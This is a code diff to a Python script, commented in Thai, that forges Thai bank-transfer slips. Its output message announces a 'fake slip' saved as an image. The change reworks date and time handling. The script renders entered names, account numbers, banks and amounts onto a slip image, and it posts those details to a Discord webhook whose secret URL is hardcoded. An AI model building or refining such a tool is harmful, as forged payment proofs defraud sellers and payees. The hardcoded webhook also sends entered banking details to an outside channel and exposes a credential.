@@ -56,7 +56,11 @@ def get_user_defined_time():
         year = str(int(current_time_thailand.strftime("%Y")) + 543)[-2:]
         time = current_time_thailand.strftime("%H:%M") + " น."
 
-    return day, month, year, time
+    # รวมวันที่และเวลาเป็นข้อความเดียวโดยไม่มีเครื่องหมาย "/"
+    defined_time = f"{day} {month} {year} {time}"
+
+    # ส่งคืน defined_time
+    return defined_time
 
 
 
@@ -273,16 +277,20 @@ def get_logo_size_and_position(background_image_path):
 
     return logo_size, logo_position
 
+
 import requests
 
-def send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time):
+def send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time_part):
     """ฟังก์ชันในการส่งข้อมูลไปยัง Discord Webhook พร้อมรูปภาพ"""
     webhook_url = "https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz"
+
+    # รวม day, month, year และ time_part เป็น defined_time
+    defined_time = f"{day} {month} {year} {time_part}"
 
     # เตรียมข้อมูล Embed ที่จะส่งไปยัง Discord
     embed = {
         "title": "ข้อมูลการโอนเงิน",
-        "description": f"จาก: {name_user_id}\nถึง: {name_me_id}\nหมายเลขบัญชีผู้รับ: {phone_me_id}\nจำนวนเงิน: {money_id}\nหมายเลขบัญชีผู้โอน: {account_user_id}\nธนาคารผู้โอน: {bank_user_id}\nธนาคารผู้รับ: {bank_me_id}\nวันที่: {day} {month} {year}\nเวลา: {time}",
+        "description": f"จาก: {name_user_id}\nถึง: {name_me_id}\nหมายเลขบัญชีผู้รับ: {phone_me_id}\nจำนวนเงิน: {money_id}\nหมายเลขบัญชีผู้โอน: {account_user_id}\nธนาคารผู้โอน: {bank_user_id}\nธนาคารผู้รับ: {bank_me_id}\nวันที่และเวลา: {defined_time}",
         "color": 65280  # สีเขียว
     }
 
@@ -316,7 +324,19 @@ def main():
     name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id = get_user_input()
 
     # รับวันและเวลา (ผู้ใช้กำหนด หรือใช้ค่าเริ่มต้น)
-    day, month, year, time = get_user_defined_time()
+    defined_time = get_user_defined_time()  # คืนค่าเป็นข้อความเดียวที่รวมวัน เดือน ปี และเวลา
+
+    # แยก defined_time ออกเป็นวัน เดือน ปี และเวลา
+    date_part, time_part = defined_time.rsplit(" ", 1)  # แยกเวลาออกจากวันที่
+
+    # แยกวันที่ออกเป็นวันที่, เดือน และปี
+    date_parts = date_part.split(" ")
+    date_info = {
+        "day": date_parts[0],
+        "month": date_parts[1],
+        "year": date_parts[2],
+        "time": time_part
+    }
 
     # โหลดภาพพื้นหลังที่เลือก
     image = load_image(background_image_path)
@@ -338,7 +358,7 @@ def main():
     fonts = prepare_fonts()
 
     # เตรียมข้อความ
-    texts = prepare_texts(name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time)
+    texts = prepare_texts(name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, date_info["day"], date_info["month"], date_info["year"], date_info["time"])
 
     # กำหนดตำแหน่งข้อความตามภาพพื้นหลัง
     positions = set_text_positions_for_background(background_image_path)
@@ -356,7 +376,7 @@ def main():
     print("สลีปปลอมสำเร็จ! บันทึกเป็น output_image.png")
 
     # ส่งข้อมูลไปยัง Discord
-    send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time)
+    send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, date_info["day"], date_info["month"], date_info["year"], date_info["time"])
 
 if __name__ == "__main__":
     main()
